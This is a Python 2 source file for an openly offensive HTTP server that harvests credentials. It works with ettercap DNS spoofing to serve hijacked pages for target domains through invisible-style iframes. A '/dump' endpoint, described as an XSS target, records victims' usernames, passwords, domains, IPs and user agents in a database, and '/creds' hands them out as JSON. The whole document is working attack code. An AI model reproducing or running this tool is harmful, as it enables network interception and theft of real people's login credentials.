# original copypasta from
# Linux Journal - thanks Mohammed Hisamuddin!
# http://georgik.sinusgear.com/2011/01/07/how-to-dump-post-request-with-python/

import os # to list directories
import sys
import BaseHTTPServer
import SocketServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
import sqlite3
import threading
from urllib import urlencode
import cgi
import json

protocol     = "HTTP/1.0"
port = 8000

host = "127.0.0.1"
blacklist = []

class ThreadedHTTPServer(SocketServer.ThreadingMixIn, BaseHTTPServer.HTTPServer):
   pass

#dbconn = sqlite3.connect('creds.db',check_same_thread = False)
dbconn = sqlite3.connect(':memory:',check_same_thread = False)
c = dbconn.cursor()
c.execute('''create table if not exists creds (user TEXT, pass TEXT, domain TEXT, ip TEXT, agent TEXT, ctime DATE DEFAULT (strftime('%s','now')))''')

print "\nRemember to run ./redirect.sh to redirect 80 to 8000"
print "Also getting users to land here is all up to you."
print "./etterpwn.sh smashes everything, duckbill.rb is more elegant"
print "Ettercap is useless until you setup you etter.dns to direct everything at you\n"

#class ServerHandler(SimpleHTTPRequestHandler):
class ServerHandler(BaseHTTPServer.BaseHTTPRequestHandler):

  def do_GET(self):
    print self.headers['Host']
    print self.headers['User-Agent']
    print self.path

    route = self.path.split('?',1)[0]

    self.send_response(200)

    self.send_header('Cache-control','no-cache')
    self.send_header('Cache-control','no-store')
    self.send_header('Pragma','no-cache')
    self.send_header('Expires','0')
    self.send_header('Content-type', 'text/html')
    self.end_headers()

    if route=='/jquery.js': # static jquery
      self.jquery();return
    if route=='/platypus.js': # static jquery
      self.platypus();return
    if route=='/pwn': # main javascripty page
      self.pwn();return
    if route=='/land': # domain jacking
      self.land();return
    if route=='/platypus.png': # domain jacking
      self.plat();return
    if route=='/dump': # xss target to dump creds
      self.dump();return
    if route=='/hi': # xss target to dump creds
      self.hi();return
    if route=='/list': # list out all the credentials so far
      self.list();return
    if route=='/creds': # list out all the credentials so far
      self.creds();return
    if route=='/blacklist': # who have we owned?
      self.blacklist();return

    self.passthrough()
    return


  def pwn(self):
    self.wfile.write('''<html><body>oh, hello there..<br><br>\n''')
    for filename in os.listdir('targets'):
      domain = filename.split('.html')[0]
      print "adding "+domain
      #self.wfile.write('''<iframe src="http://'''+domain+'''/land" height="0" width="0" style="visibility:hidden;display:none"></iframe>\n''')
      self.wfile.write('''<iframe src="http://'''+domain+'''/land" height="100" width="100" ></iframe>\n''')

  def land(self):
    hostname = self.headers['Host']
    f=open("targets/"+hostname+".html")
    self.wfile.write(f.read())

  def list(self):
    f=open("list.html")
    self.wfile.write(f.read())

  def plat(self):
    f=open("platypus.png")
    self.wfile.write(f.read())

  def jquery(self):
    f=open("jquery.js")
    self.wfile.write(f.read())

  def platypus(self):
    f=open("platypus.js")
    self.wfile.write(f.read())

  def hi(self):
    self.wfile.write("hi!")

  def dump(self):
    print "dump"
    print self.path
    args=self.path.partition('?')[2]
    creds=args.split('&',4) # domain, user, pass
    print "ip:   '"+str(self.client_address)+"'" 
    print "user: '"+str(creds[0])+"'" 
    print "pass: '"+str(creds[1])+"'"
    print "domain: '"+str(creds[2])+"'" 
    creds.append(str(self.client_address[0]))
    creds.append(str(self.headers['User-Agent']))

    # is this credential legitimate?
    if len(creds[0]) < 1:
      return
    if len(creds[1]) < 1:
      return

    # is this credential already in the db?
    results=c.execute("select * from creds where domain=? and user=?",[creds[2],creds[0]])
    for result in results:
      print "this cred is already covered"
      return

    c.execute("insert into creds (user,pass,domain,ip,agent) values(?,?,?,?,?)",creds)
    dbconn.commit()
    return

  def creds(self):
    args=self.path.partition('?')[2]
    print " ARGS : "+args
    if not args:
      print "nope"
      return
    # BLOCKING
    results = c.execute("select * from creds where ctime > ? limit 3",[args])
    credlist=[]
    for result in results:
      credlist.append(result)

    self.wfile.write(json.dumps(credlist))
    return

  def blacklist(self):
    args=self.path.partition('?')[2]
    print "ARGS ARE "+args
    ip=args.split('=',2)[1] # domain, user, pass
    print "IP IS "+ip
    if ip in blacklist:
      self.wfile.write("YUP")
    else:
      self.wfile.write("NOPE")

  def passthrough(self):
 
    # not in the blacklist?  time to own
    target = str(self.client_address[0])
    if target not in blacklist:
      blacklist.append(target)
      print "adding "+target+" to blacklist"
      for filename in os.listdir('targets'):
        domain = filename.split('.html')[0]
        print "adding "+domain
        #self.wfile.write('''<iframe src="http://'''+domain+'''/land" height="0" width="0" style="visibility:hidden;display:none"></iframe>\n''')
        self.wfile.write('''<iframe src="http://'''+domain+'''/land" height="100" width="100"></iframe>\n''')

    # spit out the automatic reload
    self.wfile.write("<script>setTimeout(function(){location.reload()},10000)</script>")
    return

server_address = ('0.0.0.0', port)

httpd = ThreadedHTTPServer(server_address, ServerHandler)
#httpd = BaseHTTPServer.HTTPServer(server_address, ServerHandler)

sa = httpd.socket.getsockname()
print "Serving HTTP on", sa[0], "port", sa[1], "..."

httpd.serve_forever()
